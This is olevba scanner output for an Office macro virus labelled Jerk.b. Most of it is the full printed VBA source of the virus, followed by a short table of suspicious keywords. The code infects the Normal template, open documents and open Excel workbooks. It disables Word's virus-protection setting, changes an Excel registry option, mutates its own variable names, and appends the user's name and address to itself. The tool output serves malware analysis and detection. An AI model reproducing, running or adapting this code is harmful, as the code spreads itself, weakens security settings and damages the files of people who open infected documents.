olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.b-f431b9bf947beed7bd77905386f353c63fd924ad
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.b-f431b9bf947beed7bd77905386f353c63fd924ad - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Workbook_Deactivate()
On Error Resume Next
Const GJXUXXZQNVYT = 1, BVBQVPTMTUNLIBD = True, WJIUIEVAZOAQRY = False, MIVOMJZRLR = 0
Dim NYARC, UDNDJFXGKAXFTQ As String
Dim HNDWMGDGHCJZKC, DCXMFJUZ As Integer
Dim GAKRMOHZAPHSVKP As Boolean
UDNDJFXGKAXFTQ = "ThisWorkbook"
NYARC = Application.ThisWorkbook.VBProject.VBComponents.Item(GJXUXXZQNVYT).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(GJXUXXZQNVYT).CodeModule.CountOfLines)
Call AEDXSHJTVLV(NYARC)
For HNDWMGDGHCJZKC = GJXUXXZQNVYT To Application.Workbooks.Count
GAKRMOHZAPHSVKP = WJIUIEVAZOAQRY
For DCXMFJUZ = GJXUXXZQNVYT To Application.Workbooks.Item(HNDWMGDGHCJZKC).VBProject.VBComponents.Count
If Application.Workbooks.Item(HNDWMGDGHCJZKC).VBProject.VBComponents.Item(DCXMFJUZ).CodeModule.CountOfLines = MIVOMJZRLR Then
If Application.Workbooks.Item(HNDWMGDGHCJZKC).Path <> "" And Application.Workbooks.Item(HNDWMGDGHCJZKC).Saved = BVBQVPTMTUNLIBD And GAKRMOHZAPHSVKP = WJIUIEVAZOAQRY Then GAKRMOHZAPHSVKP = BVBQVPTMTUNLIBD
Application.Workbooks.Item(HNDWMGDGHCJZKC).VBProject.VBComponents.Item(DCXMFJUZ).CodeModule.InsertLines GJXUXXZQNVYT, NYARC
If Application.Workbooks.Item(HNDWMGDGHCJZKC).VBProject.VBComponents.Item(DCXMFJUZ).Name = UDNDJFXGKAXFTQ Then
Application.Workbooks.Item(HNDWMGDGHCJZKC).VBProject.VBComponents.Item(DCXMFJUZ).CodeModule.ReplaceLine GJXUXXZQNVYT * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(HNDWMGDGHCJZKC).VBProject.VBComponents.Item(DCXMFJUZ).CodeModule.ReplaceLine GJXUXXZQNVYT * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next DCXMFJUZ
If GAKRMOHZAPHSVKP = BVBQVPTMTUNLIBD Then Application.Workbooks.Item(HNDWMGDGHCJZKC).Save
Next HNDWMGDGHCJZKC
End Sub
Private Sub Document_Close()
On Error Resume Next
Const BVBQVPTMTUNLIBD = True, WJIUIEVAZOAQRY = False, MIVOMJZRLR = 0, GJXUXXZQNVYT = 1, XYVJWPKGLKRS = wdFormatDocument, NKLOGCBWD = wdFormatTemplate, PFQQCCUUAK = ":"
Dim GAKRMOHZAPHSVKP, CIVHYBVYJWOKEFP, PLKUVEGNYGFH, PJKGZJKLYEAWJCU As Boolean
Dim WDNUS, QHVJYMF As Object
Dim RLISOEF, NYARC As String
If Month(GJXUXXZQNVYT * Now) > GJXUXXZQNVYT * 2 + GJXUXXZQNVYT * 3 And Day(GJXUXXZQNVYT * Now) = 4 + GJXUXXZQNVYT * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set WDNUS = ActiveDocument.VBProject.VBComponents.Item(GJXUXXZQNVYT)
Set QHVJYMF = NormalTemplate.VBProject.VBComponents.Item(GJXUXXZQNVYT)
Randomize
PLKUVEGNYGFH = WJIUIEVAZOAQRY
PJKGZJKLYEAWJCU = WJIUIEVAZOAQRY
If WDNUS.CodeModule.CountOfLines <> MIVOMJZRLR Then PLKUVEGNYGFH = BVBQVPTMTUNLIBD
If QHVJYMF.CodeModule.CountOfLines <> MIVOMJZRLR Then PJKGZJKLYEAWJCU = BVBQVPTMTUNLIBD
Options.VirusProtection = WJIUIEVAZOAQRY
If (PLKUVEGNYGFH = BVBQVPTMTUNLIBD Xor PJKGZJKLYEAWJCU = BVBQVPTMTUNLIBD) And (ActiveDocument.SaveFormat = XYVJWPKGLKRS Or ActiveDocument.SaveFormat = NKLOGCBWD) Then
If PLKUVEGNYGFH = BVBQVPTMTUNLIBD Then
CIVHYBVYJWOKEFP = NormalTemplate.Saved
NYARC = WDNUS.CodeModule.Lines(GJXUXXZQNVYT, WDNUS.CodeModule.CountOfLines)
Call LONHSETTF(NYARC)
If Int(Rnd * 10 * GJXUXXZQNVYT) = GJXUXXZQNVYT * 7 Then Call LTNYQCXYQUEEX(NYARC)
Call UAVUXABOISGMMTA(NYARC)
QHVJYMF.CodeModule.InsertLines GJXUXXZQNVYT, NYARC
If CIVHYBVYJWOKEFP = BVBQVPTMTUNLIBD Then NormalTemplate.Save
End If
RLISOEF = Mid(ActiveDocument.FullName, 2, GJXUXXZQNVYT)
If PJKGZJKLYEAWJCU = BVBQVPTMTUNLIBD And (RLISOEF = PFQQCCUUAK Or ActiveDocument.Saved = WJIUIEVAZOAQRY) Then
GAKRMOHZAPHSVKP = ActiveDocument.Saved
NYARC = QHVJYMF.CodeModule.Lines(GJXUXXZQNVYT, QHVJYMF.CodeModule.CountOfLines)
Call UAVUXABOISGMMTA(NYARC)
WDNUS.CodeModule.InsertLines GJXUXXZQNVYT, NYARC
If GAKRMOHZAPHSVKP = BVBQVPTMTUNLIBD Then ActiveDocument.Save
End If
End If
End Sub
Private Sub LTNYQCXYQUEEX(ByRef NYARC As String)
On Error Resume Next
Const LDVBCS = 48, KUICJ = 15, XWYVUOXZSYSAM = 5, XSVFLMOE = 65, HUODWPCAX = 90, GJXUXXZQNVYT = 1, BVBQVPTMTUNLIBD = True, WJIUIEVAZOAQRY = False
Dim XVEDYKRIO, PKGWAFVPRDROVVTmp, UOIPWB, PKGWAFVPRDROVV(GJXUXXZQNVYT To LDVBCS), PKGWAFVPRDROVV2(GJXUXXZQNVYT To LDVBCS) As String
Dim HNDWMGDGHCJZKC, DCXMFJUZ, LLRSJZNDCUGW As Integer
Dim EYFOZJUNHEML As Boolean
XVEDYKRIO = "NYARC LDVBCS PKGWAFVPRDROVV PKGWAFVPRDROVV2 UOIPWB HNDWMGDGHCJZKC DCXMFJUZ LLRSJZNDCUGW EYFOZJUNHEML LTNYQCXYQUEEX KUICJ XWYVUOXZSYSAM XSVFLMOE HUODWPCAX GJXUXXZQNVYT XVEDYKRIO PKGWAFVPRDROVVTmp GAKRMOHZAPHSVKP CIVHYBVYJWOKEFP PLKUVEGNYGFH PJKGZJKLYEAWJCU WDNUS QHVJYMF LONHSETTF LXDKAK ZIOXPKX BRDQLF CZHWHNHAQISPT LXDKAKTmp APVNC CQNEHFNHXS RLISOEF BVBQVPTMTUNLIBD WJIUIEVAZOAQRY MIVOMJZRLR XYVJWPKGLKRS NKLOGCBWD YBOJFKHC RPGDLGO PFQQCCUUAK UTJVUP CKKMWBVGWOHFC UDNDJFXGKAXFTQ AEDXSHJTVLV UAVUXABOISGMMTA NIGLHVLAINJNEN VZDOMIJ CKSPJCBHFWCRDIQ"
Randomize
DCXMFJUZ = GJXUXXZQNVYT
For HNDWMGDGHCJZKC = GJXUXXZQNVYT To Len(XVEDYKRIO)
If Mid(XVEDYKRIO, HNDWMGDGHCJZKC, GJXUXXZQNVYT) = " " Or HNDWMGDGHCJZKC = Len(XVEDYKRIO) Then
If HNDWMGDGHCJZKC = Len(XVEDYKRIO) Then PKGWAFVPRDROVVTmp = PKGWAFVPRDROVVTmp & Mid(XVEDYKRIO, HNDWMGDGHCJZKC, GJXUXXZQNVYT)
For LLRSJZNDCUGW = GJXUXXZQNVYT To Int((KUICJ - XWYVUOXZSYSAM + GJXUXXZQNVYT) * Rnd + XWYVUOXZSYSAM)
PKGWAFVPRDROVV2(DCXMFJUZ) = PKGWAFVPRDROVV2(DCXMFJUZ) & Chr(Int((HUODWPCAX - XSVFLMOE + GJXUXXZQNVYT) * Rnd + XSVFLMOE))
Next LLRSJZNDCUGW
PKGWAFVPRDROVV(DCXMFJUZ) = PKGWAFVPRDROVVTmp
PKGWAFVPRDROVVTmp = ""
DCXMFJUZ = DCXMFJUZ + GJXUXXZQNVYT
Else
PKGWAFVPRDROVVTmp = PKGWAFVPRDROVVTmp & Mid(XVEDYKRIO, HNDWMGDGHCJZKC, GJXUXXZQNVYT)
End If
Next HNDWMGDGHCJZKC
EYFOZJUNHEML = WJIUIEVAZOAQRY
For HNDWMGDGHCJZKC = GJXUXXZQNVYT To Len(NYARC)
For DCXMFJUZ = GJXUXXZQNVYT To LDVBCS
If Mid(NYARC, HNDWMGDGHCJZKC, Len(PKGWAFVPRDROVV(DCXMFJUZ))) = PKGWAFVPRDROVV(DCXMFJUZ) Then
UOIPWB = UOIPWB & PKGWAFVPRDROVV2(DCXMFJUZ)
HNDWMGDGHCJZKC = HNDWMGDGHCJZKC + Len(PKGWAFVPRDROVV(DCXMFJUZ)) - GJXUXXZQNVYT
EYFOZJUNHEML = BVBQVPTMTUNLIBD
Exit For
End If
Next DCXMFJUZ
If EYFOZJUNHEML = WJIUIEVAZOAQRY Then
UOIPWB = UOIPWB & Mid(NYARC, HNDWMGDGHCJZKC, GJXUXXZQNVYT)
Else
EYFOZJUNHEML = WJIUIEVAZOAQRY
End If
Next HNDWMGDGHCJZKC
NYARC = UOIPWB
End Sub
Private Sub LONHSETTF(ByRef NYARC As String)
On Error Resume Next
Const CZHWHNHAQISPT = "' ", GJXUXXZQNVYT = 1
Const YBOJFKHC = "hh:mm:ss: AMPM - ", RPGDLGO = "dddd, d mmm yyyy"
Dim LXDKAKTmp, LXDKAK, APVNC, CQNEHFNHXS, ZIOXPKX, BRDQLF As String
Dim HNDWMGDGHCJZKC As Integer
ZIOXPKX = Chr(10 * GJXUXXZQNVYT + 3)
LXDKAK = Application.UserAddress
CQNEHFNHXS = Format(Time, YBOJFKHC) & Format(Date, RPGDLGO)
BRDQLF = Chr(GJXUXXZQNVYT * 10)
APVNC = Application.UserName
For HNDWMGDGHCJZKC = GJXUXXZQNVYT To Len(LXDKAK)
If Mid(LXDKAK, HNDWMGDGHCJZKC, GJXUXXZQNVYT) <> ZIOXPKX Then
If Mid(LXDKAK, HNDWMGDGHCJZKC, GJXUXXZQNVYT) <> BRDQLF Then
LXDKAKTmp = LXDKAKTmp & Mid(LXDKAK, HNDWMGDGHCJZKC, GJXUXXZQNVYT)
End If
Else
LXDKAKTmp = LXDKAKTmp & ZIOXPKX & CZHWHNHAQISPT
End If
Next HNDWMGDGHCJZKC
NYARC = NYARC & ZIOXPKX & CZHWHNHAQISPT & CQNEHFNHXS & ZIOXPKX & CZHWHNHAQISPT & APVNC & ZIOXPKX & CZHWHNHAQISPT & LXDKAK & ZIOXPKX
End Sub
Private Sub UAVUXABOISGMMTA(ByVal NYARC As String)
On Error Resume Next
Dim CKSPJCBHFWCRDIQ As Long
Dim UTJVUP As Object
Dim NIGLHVLAINJNEN, VZDOMIJ As String
NIGLHVLAINJNEN = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
CKSPJCBHFWCRDIQ = &H0
VZDOMIJ = "Options6"
System.PrivateProfileString("", NIGLHVLAINJNEN, VZDOMIJ) = CKSPJCBHFWCRDIQ
Set UTJVUP = GetObject(, "Excel.Application")
Const GJXUXXZQNVYT = 1, MIVOMJZRLR = 0
Dim UDNDJFXGKAXFTQ As String
Dim HNDWMGDGHCJZKC, DCXMFJUZ As Integer
UDNDJFXGKAXFTQ = "ThisWorkbook"
For HNDWMGDGHCJZKC = GJXUXXZQNVYT To UTJVUP.Application.Workbooks.Count
For DCXMFJUZ = GJXUXXZQNVYT To UTJVUP.Application.Workbooks.Item(HNDWMGDGHCJZKC).VBProject.VBComponents.Count
If UTJVUP.Application.Workbooks.Item(HNDWMGDGHCJZKC).VBProject.VBComponents.Item(DCXMFJUZ).CodeModule.CountOfLines = MIVOMJZRLR Then
UTJVUP.Application.Workbooks.Item(HNDWMGDGHCJZKC).VBProject.VBComponents.Item(DCXMFJUZ).CodeModule.InsertLines GJXUXXZQNVYT, NYARC
If UTJVUP.Application.Workbooks.Item(HNDWMGDGHCJZKC).VBProject.VBComponents.Item(DCXMFJUZ).Name = UDNDJFXGKAXFTQ Then
UTJVUP.Application.Workbooks.Item(HNDWMGDGHCJZKC).VBProject.VBComponents.Item(DCXMFJUZ).CodeModule.ReplaceLine 33 * GJXUXXZQNVYT, "Private Sub Workbook_Deactivate()"
Else
UTJVUP.Application.Workbooks.Item(HNDWMGDGHCJZKC).VBProject.VBComponents.Item(DCXMFJUZ).CodeModule.ReplaceLine GJXUXXZQNVYT * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next DCXMFJUZ
Next HNDWMGDGHCJZKC
Set UTJVUP = Nothing
End Sub
Private Sub AEDXSHJTVLV(ByVal NYARC As String)
On Error Resume Next
Const BVBQVPTMTUNLIBD = True, WJIUIEVAZOAQRY = False, GJXUXXZQNVYT = 1, MIVOMJZRLR = 0
Dim CKKMWBVGWOHFC As Object
Dim CIVHYBVYJWOKEFP As Boolean
Set CKKMWBVGWOHFC = GetObject(, "Word.Application")
If CKKMWBVGWOHFC.NormalTemplate.VBProject.VBComponents.Item(GJXUXXZQNVYT).CodeModule.CountOfLines = MIVOMJZRLR Then
CIVHYBVYJWOKEFP = CKKMWBVGWOHFC.NormalTemplate.Saved
CKKMWBVGWOHFC.Options.VirusProtection = WJIUIEVAZOAQRY
CKKMWBVGWOHFC.NormalTemplate.VBProject.VBComponents.Item(GJXUXXZQNVYT).CodeModule.InsertLines GJXUXXZQNVYT, NYARC
If CIVHYBVYJWOKEFP = BVBQVPTMTUNLIBD Then CKKMWBVGWOHFC.NormalTemplate.Save
End If
Set CKKMWBVGWOHFC = Nothing
End Sub

' 01:28:26: PM - Wednesday, 10 Feb 1999
' Avert
'

' 09:20:36:  - Montag, 26 Feb 2001
' Andreas Marx
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

